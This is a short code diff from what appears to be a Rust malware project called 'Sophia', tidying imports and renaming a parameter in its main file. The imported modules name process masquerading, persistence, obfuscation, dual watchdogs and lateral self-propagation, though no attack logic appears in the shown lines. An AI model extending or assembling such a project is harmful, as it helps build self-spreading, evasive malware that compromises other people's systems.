@@ -19,22 +19,18 @@ mod watchdog;
 mod lateral;
 
 use anyhow::{anyhow, Result};
-use crypto::{SophiaCipher, SplitKeyContainer};
-use environment::{EnvironmentalLock, EnvironmentFingerprint};
+use crypto::SophiaCipher;
+use memory::SplitKeyContainer;
+use environment::EnvironmentalLock;
 use masquerade::{ProcessMasquerade, rewrite_argv_zero};
-use memory::{setup_signal_handlers, SecureMemory};
+use memory::setup_signal_handlers;
 use persistence::PersistenceManager;
 use obfuscation::{ObfuscationEngine, DispatcherState};
 use plugin::PluginManager;
 use watchdog::{WatchdogConfig, DualWatchdog, get_watchdog_role_from_args, start_watchdog_mode};
 use lateral::{PropagationConfig, PropagationManager, create_self_propagating_payload};
-use std::path::PathBuf;
 use std::process;
-use std::sync::atomic::{AtomicBool, Ordering};
 use uuid::Uuid;
-use rand::Rng;
-
-static POLYMORPHIC_SEED: AtomicBool = AtomicBool::new(false);
 
 struct SophiaCore {
     session_id: String,
@@ -230,7 +226,7 @@ impl SophiaCore {
         Ok(())
     }
 
-    fn main_loop(&mut self, cipher: &SophiaCipher) -> Result<()> {
+    fn main_loop(&mut self, _cipher: &SophiaCipher) -> Result<()> {
         let mut iteration_count: u64 = 0;
         loop {
             if memory::is_cleanup_initiated() {
